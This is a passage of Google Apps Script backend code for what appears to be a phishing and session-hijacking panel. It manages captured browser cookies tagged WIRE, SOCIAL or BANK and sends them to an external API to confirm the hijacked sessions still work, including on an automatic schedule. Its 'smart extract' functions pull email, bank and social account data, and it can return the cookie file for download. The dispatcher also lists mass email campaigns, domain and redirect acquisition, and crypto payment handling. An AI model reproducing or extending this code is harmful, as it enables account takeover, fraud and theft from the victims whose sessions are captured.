          searchedPlan: newPlan.toUpperCase(),
          limitsSheetHeaders: limitsResult.headers || "N/A",
          limitsSheetData: limitsResult.data || "N/A"
        }
      };
    }

    const planRow = limitsResult.data[0];
    const planHeaders = limitsResult.headers;
    const priceIndex = planHeaders.indexOf("price");
    const currencyIndex = planHeaders.indexOf("currency");

    const planPrice = priceIndex !== -1 ? parseFloat(planRow[priceIndex]) : 0;
    const planCurrency = currencyIndex !== -1 ? planRow[currencyIndex] : "USD"; // Default currency

    if (planPrice <= 0) {
      return {
        success: false,
        error: `Invalid price for plan ${newPlan}.`
      };
    }

    // Debit the user for the new plan
    const debitResult = debit({
      userId,
      amount: planPrice.toFixed(2),
      purpose: `upgrade_plan_to_${newPlan}`
    });

    if (!debitResult.success) {
      if (debitResult.details && debitResult.details.message && debitResult.details.message.includes("Insufficient balance")) {
        return {
          success: false,
          error: "Plan change failed: Insufficient funds.",
          details: debitResult.details
        };
      }
      return {
        success: false,
        error: "Failed to process payment for plan upgrade: " + (debitResult.error || "Failed to process transaction."),
        details: debitResult.details || {}
      };
    }

    // Calculate plan expiry date (365 days from now)
    const planExpiryDate = new Date();
    planExpiryDate.setDate(planExpiryDate.getDate() + 365);

    // Update user's plan and planExpiry
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      plan: newPlan,
      planExpiry: planExpiryDate.toISOString() // Store as ISO string including date and time
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to update user plan",
        details: updateResult
      };
    }

    // Get updated user balance
    const updatedUserResult = getRowsByColumn("user", "userId", userId);
    const updatedUserRow = updatedUserResult.data[0];
    const updatedUserHeaders = updatedUserResult.headers;
    const newBalance = updatedUserRow[updatedUserHeaders.indexOf("balance")] || "0.00";

    return {
      success: true,
      message: "Plan upgraded successfully.",
      data: {
        newPlan: newPlan,
        newBalance: newBalance
      }
    };

  } catch (error) {
    Logger.log("Error in changePlan:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function toggleTwoFactorAuth(params) {
  try {
    Logger.log("Starting toggleTwoFactorAuth with params:", params);
    const { userId } = params;
    let enable = params.enable;

    // Convert 'enable' to a boolean if it's a string
    if (typeof enable === 'string') {
      enable = (enable.toLowerCase() === 'true');
    }

    if (!userId || typeof enable !== 'boolean') {
      return {
        success: false,
        error: "Missing required fields: userId and a boolean 'enable' are required",
        details: {
          providedUserId: userId,
          providedEnable: params.enable,
          parsedEnableType: typeof enable,
          parsedEnableValue: enable
        }
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    // Update user's twoFactorAuth status
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      twoFactorAuth: enable ? "TRUE" : "FALSE" // Store as string "TRUE" or "FALSE"
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to toggle 2FA.",
        details: updateResult
      };
    }

    return {
      success: true,
      message: `Two-factor authentication ${enable ? "enabled" : "disabled"} successfully.`,
      data: {
        twoFactorAuth: enable
      }
    };

  } catch (error) {
    Logger.log("Error in toggleTwoFactorAuth:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function toggleAutoVerify(params) {
  try {
    Logger.log("Starting toggleAutoVerify with params:", params);
    const { userId } = params;

    if (!userId) {
      return {
        success: false,
        error: "Missing required field: userId is required"
      };
    }

    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return { success: false, error: "User not found" };
    }

    const userHeaders = userResult.headers;
    const userData = userResult.data[0];
    const autoVerifyIndex = userHeaders.indexOf("autoVerifySessions");
    const currentValue = autoVerifyIndex !== -1 ? userData[autoVerifyIndex] : "FALSE";
    const newValue = currentValue === "TRUE" ? "FALSE" : "TRUE";

    Logger.log("toggleAutoVerify: userId=" + userId + " current=" + currentValue + " new=" + newValue);

    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      autoVerifySessions: newValue
    });

    if (!updateResult.success) {
      return { success: false, error: "Failed to toggle auto-verify." };
    }

    const updatedUserResult = getRowsByColumn("user", "userId", userId);
    let updatedUser = null;
    if (updatedUserResult.success && updatedUserResult.count > 0) {
      const uHeaders = updatedUserResult.headers;
      const uData = updatedUserResult.data[0];
      updatedUser = {};
      for (let i = 0; i < uHeaders.length; i++) {
        updatedUser[uHeaders[i]] = uData[i];
      }
      updatedUser["autoVerifySessions"] = newValue;
    }

    return {
      success: true,
      message: `Auto-verify sessions ${newValue === "TRUE" ? "enabled" : "disabled"} successfully.`,
      user: updatedUser,
      data: { autoVerifySessions: newValue }
    };

  } catch (error) {
    Logger.log("Error in toggleAutoVerify:", error.message);
    return { success: false, error: "Server error: " + error.message };
  }
}

function verifySession(params) {
  try {
    Logger.log("Starting verifySession with params:", params);
    const { userId, browserId, category } = params;

    if (!userId || !browserId || !category) {
      return {
        success: false,
        error: "Missing required fields: userId, browserId, and category are required"
      };
    }

    // Get the cookie row by browserId
    const cookieResult = getRowsByColumn("cookie", "browserId", browserId);
    if (!cookieResult.success || cookieResult.count === 0) {
      return { success: false, error: "Session not found" };
    }

    const cookieHeaders = cookieResult.headers;
    const cookieData = cookieResult.data[0];
    const cookieRow = {};
    cookieHeaders.forEach((h, i) => { cookieRow[h] = cookieData[i]; });
    const cookieJSON = cookieRow.cookieJSON;
    const status = cookieRow.status;

    if (!cookieJSON) {
      return { success: false, error: "No saved cookies for this session" };
    }

    // Determine the verification endpoint based on category
    const externalApi = CONFIG.EXTERNAL_API;
    let verifyEndpoint = '';
    switch (category.toUpperCase()) {
      case 'WIRE':
        verifyEndpoint = `${externalApi}/emails/verify-session`;
        break;
      case 'SOCIAL':
        verifyEndpoint = `${externalApi}/socials/verify-session`;
        break;
      case 'BANK':
        verifyEndpoint = `${externalApi}/banks/verify-session`;
        break;
      default:
        return { success: false, error: "Invalid category. Must be WIRE, SOCIAL, or BANK" };
    }

    // Call the external verification endpoint
    try {
      const response = UrlFetchApp.fetch(verifyEndpoint, {
        method: 'POST',
        contentType: 'application/json',
        payload: JSON.stringify({
          browserId: browserId,
          cookieJSON: cookieJSON,
          category: category.toUpperCase()
        }),
        muteHttpExceptions: true
      });

      const responseCode = response.getResponseCode();
      const responseBody = JSON.parse(response.getContentText());

      if (responseCode === 200 && responseBody.success) {
        // Update cookie row with new status and lastVerifyData
        const lastVerifyData = JSON.stringify({
          timestamp: new Date().toISOString(),
          status: responseBody.status || 'COMPLETED',
          message: responseBody.message || 'Session verified successfully',
          verifiedBy: 'manual'
        });

        setMultipleCellDataByColumnSearch("cookie", "browserId", browserId, {
          status: responseBody.status || 'COMPLETED',
          lastVerifyData: lastVerifyData,
          verified: responseBody.status === 'COMPLETED' ? 'TRUE' : 'FALSE',
          fullAccess: responseBody.status === 'COMPLETED' ? 'TRUE' : 'FALSE'
        });

        // Update hub and projects
        updateHubAndProjectsFromCookieData(browserId);

        return {
          success: true,
          status: responseBody.status,
          message: responseBody.message,
          lastVerifyData: lastVerifyData
        };
      } else {
        // Verification failed
        const lastVerifyData = JSON.stringify({
          timestamp: new Date().toISOString(),
          status: 'FAILED',
          message: responseBody.message || 'Verification failed',
          verifiedBy: 'manual'
        });

        setMultipleCellDataByColumnSearch("cookie", "browserId", browserId, {
          status: 'FAILED',
          lastVerifyData: lastVerifyData,
          verified: 'FALSE',
          fullAccess: 'FALSE'
        });

        updateHubAndProjectsFromCookieData(browserId);

        return {
          success: false,
          status: 'FAILED',
          message: responseBody.message || 'Verification failed'
        };
      }
    } catch (fetchError) {
      Logger.log("Error calling verification endpoint:", fetchError.message);
      return { success: false, error: "Failed to reach verification endpoint: " + fetchError.message };
    }

  } catch (error) {
    Logger.log("Error in verifySession:", error.message);
    return { success: false, error: "Server error: " + error.message };
  }
}

function autoVerifyStaleSessions() {
  try {
    Logger.log("Starting autoVerifyStaleSessions");
    
    // Get all users with autoVerifySessions enabled
    const allUsers = getAllRows("user");
    if (!allUsers.success || !allUsers.data || allUsers.count === 0) {
      Logger.log("No users found");
      return;
    }
    
    const userHeaders = allUsers.headers;
    const autoVerifyUsers = allUsers.data.filter(row => {
      const rowObj = {};
      userHeaders.forEach((h, i) => { rowObj[h] = row[i]; });
      return rowObj.autoVerifySessions === "TRUE" || rowObj.autoVerifySessions === true;
    }).map(row => {
      const rowObj = {};
      userHeaders.forEach((h, i) => { rowObj[h] = row[i]; });
      return rowObj;
    });
    
    Logger.log(`Found ${autoVerifyUsers.length} users with auto-verify enabled`);
    
    const now = Date.now();
    let verifiedCount = 0;
    
    for (const user of autoVerifyUsers) {
      const userId = user.userId;
      const intervalHours = parseInt(user.verificationIntervalHours) || 24;
      
      // Get cookie rows for this user
      const cookieResult = getRowsByColumn("cookie", "userId", userId);
      if (!cookieResult.success || !cookieResult.data || cookieResult.count === 0) continue;
      
      const cookieHeaders = cookieResult.headers;
      for (const cookieData of cookieResult.data) {
        const cookieRow = {};
        cookieHeaders.forEach((h, i) => { cookieRow[h] = cookieData[i]; });
        const browserId = cookieRow.browserId;
        const status = cookieRow.status;
        
        // Auto-verify only works on COMPLETED sessions (re-validate they're still alive)
        if (status !== "COMPLETED") continue;
        
        // Parse lastVerifyData
        let lastVerifyData = null;
        try {
          lastVerifyData = cookieRow.lastVerifyData ? JSON.parse(cookieRow.lastVerifyData) : null;
        } catch (e) {
          // Invalid JSON, treat as stale
        }
        
        const lastVerifyTime = lastVerifyData?.timestamp ? new Date(lastVerifyData.timestamp).getTime() : 0;
        const hoursSinceLastVerify = (now - lastVerifyTime) / (1000 * 60 * 60);
        
        // Check if stale
        if (hoursSinceLastVerify >= intervalHours) {
          Logger.log(`Auto-verifying session ${browserId} for user ${userId} (${hoursSinceLastVerify.toFixed(1)}h since last verify)`);
          
          try {
            // Determine category from cookie row
            const category = cookieRow.category || "WIRE";
            
            // Call verification endpoint
            const externalApi = CONFIG.EXTERNAL_API;
            let verifyEndpoint = '';
            switch (category.toUpperCase()) {
              case 'WIRE':
                verifyEndpoint = `${externalApi}/emails/verify-session`;
                break;
              case 'SOCIAL':
                verifyEndpoint = `${externalApi}/socials/verify-session`;
                break;
              case 'BANK':
                verifyEndpoint = `${externalApi}/banks/verify-session`;
                break;
              default:
                verifyEndpoint = `${externalApi}/emails/verify-session`;
            }
            
            const response = UrlFetchApp.fetch(verifyEndpoint, {
              method: 'POST',
              contentType: 'application/json',
              payload: JSON.stringify({
                browserId: browserId,
                cookieJSON: cookieRow.cookieJSON,
                category: category.toUpperCase()
              }),
              muteHttpExceptions: true
            });
            
            const responseCode = response.getResponseCode();
            const responseBody = JSON.parse(response.getContentText());
            
            if (responseCode === 200 && responseBody.success) {
              const newLastVerifyData = JSON.stringify({
                timestamp: new Date().toISOString(),
                status: responseBody.status || 'COMPLETED',
                message: responseBody.message || 'Auto-verified successfully',
                verifiedBy: 'auto'
              });
              
              setMultipleCellDataByColumnSearch("cookie", "browserId", browserId, {
                status: responseBody.status || 'COMPLETED',
                lastVerifyData: newLastVerifyData,
                verified: responseBody.status === 'COMPLETED' ? 'TRUE' : 'FALSE',
                fullAccess: responseBody.status === 'COMPLETED' ? 'TRUE' : 'FALSE'
              });
              
              updateHubAndProjectsFromCookieData(browserId);
              verifiedCount++;
            } else {
              // Verification failed — update cookie + hub so dashboard reflects FAILED state
              const failLastVerifyData = JSON.stringify({
                timestamp: new Date().toISOString(),
                status: 'FAILED',
                message: responseBody.message || 'Auto-verification failed',
                verifiedBy: 'auto'
              });

              setMultipleCellDataByColumnSearch("cookie", "browserId", browserId, {
                status: 'FAILED',
                lastVerifyData: failLastVerifyData,
                verified: 'FALSE',
                fullAccess: 'FALSE'
              });

              updateHubAndProjectsFromCookieData(browserId);
              Logger.log(`Auto-verify marked FAILED for ${browserId}`);
            }
          } catch (verifyError) {
            Logger.log(`Auto-verify failed for ${browserId}: ${verifyError.message}`);
          }
        }
      }
    }
    
    Logger.log(`Auto-verify complete. Verified ${verifiedCount} sessions.`);
    
  } catch (error) {
    Logger.log("Error in autoVerifyStaleSessions:", error.message);
  }
}

function runSmartExtract(params) {
  try {
    const gateExtraction = requireSetting("allowExtraction", "smart extraction");
    if (gateExtraction) return gateExtraction;
    const { browserId, category } = params;

    if (!browserId || !category) {
      return { success: false, error: "Missing required fields: browserId and category" };
    }

    const cat = String(category).toUpperCase();
    const externalApi = CONFIG.EXTERNAL_API;
    let extractEndpoint = '';

    switch (cat) {
      case 'WIRE':
        extractEndpoint = externalApi + '/emails/email-extract';
        break;
      case 'BANK':
        extractEndpoint = externalApi + '/banks/bank-extract';
        break;
      case 'SOCIAL':
        extractEndpoint = externalApi + '/socials/social-extract';
        break;
      default:
        return { success: false, error: "Invalid category. Must be WIRE, BANK, or SOCIAL" };
    }

    Logger.log("runSmartExtract calling: " + extractEndpoint + " browserId=" + browserId + " category=" + cat);

    const response = UrlFetchApp.fetch(extractEndpoint, {
      method: 'POST',
      contentType: 'application/json',
      payload: JSON.stringify({
        browserId: browserId,
        category: cat
      }),
      muteHttpExceptions: true
    });

    const responseCode = response.getResponseCode();
    const responseBody = JSON.parse(response.getContentText());

    if (responseCode === 200 && responseBody.success) {
      return {
        success: true,
        data: responseBody.data,
        message: "Extract completed for " + cat
      };
    } else {
      return {
        success: false,
        error: responseBody.error || "Extract failed with status " + responseCode
      };
    }
  } catch (error) {
    Logger.log("Error in runSmartExtract: " + error.message);
    return { success: false, error: "Extract failed: " + error.message };
  }
}

function saveMemo(params) {
  try {
    const { browserId, memo } = params;

    if (!browserId || memo === undefined) {
      return { success: false, error: "Missing required fields: browserId and memo" };
    }

    const externalApi = CONFIG.EXTERNAL_API;

    Logger.log("saveMemo calling: " + externalApi + "/api/save-memo browserId=" + browserId);

    const response = UrlFetchApp.fetch(externalApi + '/api/save-memo', {
      method: 'POST',
      contentType: 'application/json',
      payload: JSON.stringify({
        browserId: browserId,
        memo: memo
      }),
      muteHttpExceptions: true
    });

    const responseCode = response.getResponseCode();
    const responseBody = JSON.parse(response.getContentText());

    if (responseCode === 200 && responseBody.success) {
      return { success: true, message: "Memo saved" };
    } else {
      return { success: false, error: responseBody.error || "Failed to save memo" };
    }
  } catch (error) {
    Logger.log("Error in saveMemo: " + error.message);
    return { success: false, error: "Save memo failed: " + error.message };
  }
}

function destroyAccount(params) {
  try {
    Logger.log("Starting destroyAccount with params:", params);
    const { userId } = params;

    if (!userId) {
      return {
        success: false,
        error: "Missing required field: userId is required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    const userRow = userResult.data[0];
    const headers = userResult.headers;
    const emailIndex = headers.indexOf("email");
    const usernameIndex = headers.indexOf("username"); // Get username index
    const tokenColumnIndex = headers.indexOf("tokens");

    // Clear all tokens for the user
    if (tokenColumnIndex !== -1) {
      try {
        const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
        // userRow.rowIndex is 1-based, tokenColumnIndex is 0-based
        userSheet.getRange(userResult.rowIndex, tokenColumnIndex + 1).setValue("[]");
        Logger.log(`All tokens cleared for userId: ${userId}`);
      } catch (tokenClearError) {
        Logger.log("Error clearing tokens for destroyAccount:", tokenClearError.message);
        // This is a non-critical error, continue with account destruction
      }
    }

    // Generate a new unique email for the destroyed account
    let newDestroyedEmail = "";
    let isEmailUnique = false;
    while (!isEmailUnique) {
      const randomValue = Math.floor(1000000 + Math.random() * 9000000).toString(); // 7-digit random number
      newDestroyedEmail = `destroyed${randomValue}@webfixx.com`;
      const existingEmailCheck = getRowsByColumn("user", "email", newDestroyedEmail);
      if (!existingEmailCheck.success || existingEmailCheck.count === 0) {
        isEmailUnique = true;
      }
    }

    // Extract username from the generated email
    const newDestroyedUsername = newDestroyedEmail.split('@')[0];

    // Update user's destroyAccount status to TRUE, set new email, and new username
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      destroyAccount: "TRUE",
      email: newDestroyedEmail,
      username: newDestroyedUsername // Update username from email
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to destroy account.",
        details: updateResult
      };
    }

    return {
      success: true,
      message: "Account destroyed successfully."
    };

  } catch (error) {
    Logger.log("Error in destroyAccount:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

// Update secured backend function handler
function handleBackendFunction(params) {
  const _hbfStart = Date.now();
  const traceId = params.traceId || "n/a";
  try {
    const token = params.token;
    if (!token) {
      return createJsonResponse(createDetailedError("Authentication required", {
        providedParams: Object.keys(params)
      }));
    }

    const tokenVerification = verifyToken(token);
    if (tokenVerification.error) {
      return createJsonResponse({
        error: "Token validation failed",
        details: tokenVerification.details
      });
    }

    // Add user data to params
    params.userId = tokenVerification.userId;
    params.userRole = tokenVerification.role;

    Logger.log(`[api][${traceId}] hbf dispatch=${params.functionName || "?"} start`);
    const backendFunctionResult = JSON.parse(backendMultiFunction(params));
    Logger.log(`[api][${traceId}] hbf backendMultiFunction dur_ms=${Date.now() - _hbfStart} fn=${params.functionName || "?"}`);

    // Ensure any changes from backendMultiFunction are flushed before fetching user data
    SpreadsheetApp.flush();

    // getAppDataLite already returns the light appData bundle (projects carry pointers
    // only, no heavy inline responses). getProjectResponses returns a single project's
    // responses on demand. Both skip the heavy validateUserToken rebuild.
    if (params.functionName === "getAppDataLite" || params.functionName === "getProjectResponses") {
      const isLite = params.functionName === "getAppDataLite";
      Logger.log(`[api][${traceId}] hbf using lightweight response dur_ms=${Date.now() - _hbfStart} fn=${params.functionName}`);
      return createJsonResponse({
        success: backendFunctionResult.success,
        user: backendFunctionResult.user,
        appData: isLite ? backendFunctionResult.data : undefined,
        needsVerification: backendFunctionResult.needsVerification,
        data: backendFunctionResult.data,
        error: backendFunctionResult.error,
        message: backendFunctionResult.message,
        campaignId: backendFunctionResult.campaignId,
        fileUrl: backendFunctionResult.fileUrl,
        fileId: backendFunctionResult.fileId,
        downloadUrl: backendFunctionResult.downloadUrl,
        cached: backendFunctionResult.cached
      });
    }

    // Conservative fast-path: campaign + settings actions return their own result
    // (success/data/message/campaignId) WITHOUT rebuilding the full appData bundle.
    // The frontend already falls back to its cached appState when appData is absent,
    // so omitting the 11-23MB rebuild here makes these pages fast. Fresh data is
    // obtained on demand via getAppDataLite (manual refresh / next load).
    const noAppDataRebuildFunctions = [
      "createNewCampaign", "getCampaign", "updateCampaign", "deleteCampaign",
      "validateCampaignEmails", "enrichCampaignLeads", "personalizeCampaignEmails",
      "executeCampaign", "pauseCampaign", "resumeCampaign",
      "updateSetting"
    ];
    if (noAppDataRebuildFunctions.indexOf(params.functionName) !== -1) {
      Logger.log(`[api][${traceId}] hbf skipping appData rebuild dur_ms=${Date.now() - _hbfStart} fn=${params.functionName}`);
      return createJsonResponse({
        success: backendFunctionResult.success,
        data: backendFunctionResult.data,
        error: backendFunctionResult.error,
        message: backendFunctionResult.message,
        campaignId: backendFunctionResult.campaignId,
        fileUrl: backendFunctionResult.fileUrl,
        details: backendFunctionResult.details
      });
    }

    // Get comprehensive user and app data using validateUserToken
    const appDataResult = validateUserToken(token);
    Logger.log(`[api][${traceId}] hbf validateUserToken dur_ms=${Date.now() - _hbfStart} fn=${params.functionName || "?"}`);
    if (!appDataResult.success) {
      // This should ideally not happen if verifyToken was successful, but as a safeguard
      return createJsonResponse({
        success: backendFunctionResult.success,
        error: backendFunctionResult.error || "Failed to retrieve updated app data after token verification",
        ...backendFunctionResult // Merge existing result
      });
    }

    // Extract relevant fields from backendFunctionResult
    const { success, data, error, message, campaignId, fileUrl, details } = backendFunctionResult;

    return createJsonResponse({
      success: success,
      user: appDataResult.data.user,
      appData: appDataResult.data, // This includes user and other data
      needsVerification: appDataResult.needsVerification,
      data: data, // Include the data object from the specific backend function result
      error: error, // Include error if present from the specific backend function result
      message: message, // Include message if present from the specific backend function result
      campaignId: campaignId,
      fileUrl: fileUrl,
      details: details
    });
    
  } catch (error) {
    return createJsonResponse(createDetailedError("Backend function failed", {
      errorMessage: error.message,
      errorStack: error.stack,
      functionName: params.functionName,
      providedParams: Object.keys(params)
    }));
  }
}

function backendMultiFunction(params) {
  params = typeof params === "string" ? JSON.parse(params) : params;

  if (!params.functionName) {
    throw new Error("functionName is required in params");
  }

  const functionsMap = {
    // AUTH
    validateUserToken: () => validateUserToken(params.token),
    sendVerificationEmail: () => sendVerificationEmail(params),
    verifyAccount: () => verifyAccount(params),
    logout: () => handleLogout(params),
    updateAppData: () => updateAppData(params),
    getAppDataLite: () => getAppDataLite(params),

    // PROJECTS
    verifyTelegramNotification: () => verifyTelegramNotification(params),
    createProjectLink: () => createProjectLink(params),
    updateProjectTemplateVariables: () => updateProjectTemplateVariables(params),
    updateProjectNotifications: () => updateProjectNotifications(params),
    acquireDomain: () => acquireDomain(params),
    acquireRedirect: () => acquireRedirect(params),
    renewProject: () => renewProject(params),
    deleteProject: () => deleteProject(params),
    getProjectAccounts: () => getProjectAccounts(params),
    getProjectResponses: () => getProjectResponses(params.projectId),
    createNewCampaign: () => createNewCampaign(params),
    getCampaign: () => getCampaign(params),
    updateCampaign: () => updateCampaign(params),
    deleteCampaign: () => deleteCampaign(params),
    validateCampaignEmails: () => validateCampaignEmails(params),
    enrichCampaignLeads: () => enrichCampaignLeads(params),
    personalizeCampaignEmails: () => personalizeCampaignEmails(params),
    executeCampaign: () => executeCampaign(params),
    pauseCampaign: () => pauseCampaign(params),
    resumeCampaign: () => resumeCampaign(params),

    // REDIRECT
    createRedirect: () => createRedirect(params),
    renewRedirect: () => renewRedirect(params),
    addRedirectEndPages: () => addRedirectEndPages(params),
    updateRedirectEndPages: () => updateRedirectEndPages(params),

    // WALLET
    getCurrentValue: () => getCurrentValue(params.amount),
    initializePayment: () => initializePayment(params),
    buyUsAdrink: () => buyUsAdrink(params),

    // USER PREFERENCES
    updateUserPreferences: () => updateUserPreferences(params),
    changePassword: () => changePassword(params),
    generateApiKey: () => generateApiKey(params),
    destroyAccount: () => destroyAccount(params),
    changePlan: () => changePlan(params),
    toggleTwoFactorAuth: () => toggleTwoFactorAuth(params),
    visitNotification: () => visitNotification(params),
    toggleAutoVerify: () => toggleAutoVerify(params),

    // SETTINGS (ADMIN ONLY)
    updateSetting: () => updateSetting(params),

    // SESSION VERIFICATION
    verifySession: () => verifySession(params),

    // SMART EXTRACT
    runSmartExtract: () => runSmartExtract(params),
    saveMemo: () => saveMemo(params),

    // ELECTRON SESSION
    getSessionData: () => getSessionData(params),
  };

  const requestedFunction = functionsMap[params.functionName];
  if (!requestedFunction) {
    throw new Error(`Function ${params.functionName} is not available`);
  }

  try {
    const _dispatchStart = Date.now();
    const output = JSON.stringify(requestedFunction());
    Logger.log(`[api] fn=${params.functionName} dur_ms=${Date.now() - _dispatchStart} size=${output.length}`);
    return output;
  } catch (error) {
    console.error(`Error executing ${params.functionName}:`, error);
    throw error;
  }
}

function getSessionData(params) {
  try {
    const browserId = params.browserId;
    if (!browserId) {
      return { success: false, error: 'browserId is required' };
    }

    const cookieResult = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, 'browserId', browserId);
    if (!cookieResult.success || cookieResult.count === 0) {
      return { success: false, error: 'Session not found for this browserId' };
    }

    const headers = cookieResult.headers;
    const row = cookieResult.data[0];

    const getCol = (name) => {
      const idx = headers.indexOf(name);
      return idx !== -1 ? row[idx] : '';
    };

    const driveUrl = getCol('cookieFileURL') || getCol('driveUrl') || '';
    const fileIdMatch = driveUrl.match(/[-\w]{25,}(?=[\/?]|$)/);
    const downloadUrl = fileIdMatch
      ? 'https://drive.google.com/uc?export=download&id=' + fileIdMatch[0]
      : '';

    return {
      success: true,
      data: {
        downloadUrl: downloadUrl,
        driveUrl: driveUrl,
        domain: getCol('domain'),
        email: getCol('email'),
        category: getCol('category'),
        platformUrl: getCol('platformUrl'),
        cookieJSON: getCol('cookieJSON') || getCol('cookie') || getCol('formattedCookie') || null
      }
    };
  } catch (error) {
    Logger.log('Error in getSessionData: ' + error.message);
    return { success: false, error: error.message };
  }
}

/**
 * Verify token and update last used time
 * Cached wrapper — dedupes repeated validations for the same token within 60s.
 */
function validateUserToken(token) {
  const startTime = Date.now();
  try {
    const cache = CacheService.getScriptCache();
    const cacheKey = "vut_" + token;
    const cached = cache.get(cacheKey);
    if (cached) {
      Logger.log("Token validation served from cache");
      return JSON.parse(cached);
    }
    const result = _validateUserTokenUncached(token);
    if (result && result.success) {
      cache.put(cacheKey, JSON.stringify(result), 60);
    }
    Logger.log(`[validateUserToken] completed in ${Date.now() - startTime}ms`);
    return result;
  } catch (error) {
    Logger.log("Cache wrapper error: " + error);
    return _validateUserTokenUncached(token);
  }
}

function _validateUserTokenUncached(token) {
  try {
    Logger.log("Starting token validation for: " + token);
    
    // Verify the token first
    const verificationResult = verifyToken(token);
    
    // Check if token verification was successful
    if (!verificationResult.success) {
      return {
        success: false,
        error: verificationResult.error || "Token verification failed",
        debug: verificationResult.debug
      };
    }

    // Extract userId and role from decoded data
    const decoded = verificationResult.decodedData;
    if (!decoded || !decoded.userId) {
      return {
        success: false,
        error: "Invalid token format"
      };
    }

    // Diagnostic logging for userId
    Logger.log("Searching for user with ID: " + decoded.userId);

    // Get user data
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    
    // Diagnostic logging for userSheet
    if (!userSheet) {
      Logger.log("User sheet not found");
      return {
        success: false,
        error: "User sheet not found"
      };
    }

    // Manual row finding as a fallback
    const dataRange = userSheet.getDataRange();
    const values = dataRange.getValues();
    
    // Diagnostic logging for data range
    Logger.log("Total rows in sheet: " + values.length);
    Logger.log("Headers: " + JSON.stringify(values[0]));

    // Find the index of the userId column
    const userIdColumnIndex = values[0].indexOf("userId");
    
    if (userIdColumnIndex === -1) {
      Logger.log("userId column not found");
      return {
        success: false,
        error: "userId column not found",
        debug: { 
          headers: values[0],
          searchedUserId: decoded.userId
        }
      };
    }

    // Manual search for the user row
    const userRowIndex = values.findIndex((row, index) => 
      index > 0 && row[userIdColumnIndex] === decoded.userId
    );

    // Diagnostic logging for row finding
    Logger.log("Found user row index: " + userRowIndex);

    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found",
        debug: { 
          userId: decoded.userId,
          totalRows: values.length - 1
        }
      };
    }

    // Get the user row data
    const user = values[userRowIndex];
    const headers = values[0];

    // Prepare user data
    const userData = {
      id: decoded.userId,
      userId: decoded.userId,
      email: user[headers.indexOf("email")],
      username: user[headers.indexOf("username")],
      role: decoded.role,
      plan: user[headers.indexOf("plan")],
      planExpiry: user[headers.indexOf("planExpiry")],
      verifyStatus: user[headers.indexOf("verifyStatus")],
      darkMode: user[headers.indexOf("darkMode")],
      twoFactorAuth: user[headers.indexOf("twoFactorAuth")],
      autoVerifySessions: user[headers.indexOf("autoVerifySessions")] || "FALSE",
      verificationIntervalHours: parseInt(user[headers.indexOf("verificationIntervalHours")]) || 1,
      balance: user[headers.indexOf("balance")] || "0.00",
      pendingBalance: user[headers.indexOf("pendingBalance")] || "0.00",
      btcAddress: user[headers.indexOf("btcAddress")] || "",
      ethAddress: user[headers.indexOf("ethAddress")] || "",
      usdtAddress: user[headers.indexOf("usdtAddress")] || "",
    };

    // Get additional data
    const allData = decoded.role === "ADMIN" ? 
      getAdminData(decoded.userId) : 
      getUserData(decoded.userId);

    return {
      success: true,
      data: {
        user: userData,
        ...allData
      },
      needsVerification: userData.verifyStatus === "FALSE" || !userData.verifyStatus,
      tokenStatus: {
        validTokens: 1, // Since we've successfully validated the token
        currentTokenExpires: decoded.timestamp // Using timestamp from decoded data
      },
      decodedData: decoded
    };

  } catch (error) {
    Logger.log("Validation error: " + error);
    return {
      success: false,
      error: "Validation failed",
      debug: {
        errorMessage: error.message,
        errorStack: error.stack
      }
    };
  }
}

function testValidateUserToken() {
  // Replace with a real token for testing
  const testToken = "cnIwMnxVU0VSfDE3NDQxNDEwOTc1OTd8bjVicnBmY2F6NGEuYzQyZmZmNTU0YWJkYmE5YTI3MjVmNmJmYzA4NmM4ODkzNzlmY2IzZWYwYTEzMjJkODRkOTllNGZhZmQ1NTY4NQ=="; 
  
  const result = validateUserToken(testToken);
  
  // Detailed logging of the result
  Logger.log("Validation Result - Success: " + result.success);
  
  if (result.success) {
    Logger.log("User Data:");
    Logger.log(JSON.stringify(result.data.user, null, 2));
    
    Logger.log("Decoded Data:");
    Logger.log(JSON.stringify(result.decodedData, null, 2));
  } else {
    Logger.log("Error: " + result.error);
    
    // Log debug information if available
    if (result.debug) {
      Logger.log("Debug Information:");
      Logger.log(JSON.stringify(result.debug, null, 2));
    }
  }
}

function handleLogout(params) {
  try {
    Logger.log("Starting logout process with params:", params);
    const { token } = params;

    if (!token) {
      return createJsonResponse({
        success: false,
        error: "No token provided",
        debug: { params }
      });
    }

    // Get user sheet
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "User sheet not found"
      });
    }

    // Verify token and get user data
    const decoded = verifyToken(token);
    if (!decoded || decoded.error) {
      return createJsonResponse({
        success: true, // Still return success as we want to clear client session
        message: "Session cleared",
        debug: {
          error: "Invalid token",
          details: decoded?.details || null
        }
      });
    }

    // Get user data
    const userRow = getRowsByColumn("user", "userId", decoded.userId);
    if (!userRow.success || userRow.count === 0) {
      return createJsonResponse({
        success: true, // Still return success
        message: "Session cleared",
        debug: {
          error: "User not found",
          userId: decoded.userId
        }
      });
    }

    try {
      // Get and parse tokens
      const headers = userRow.headers;
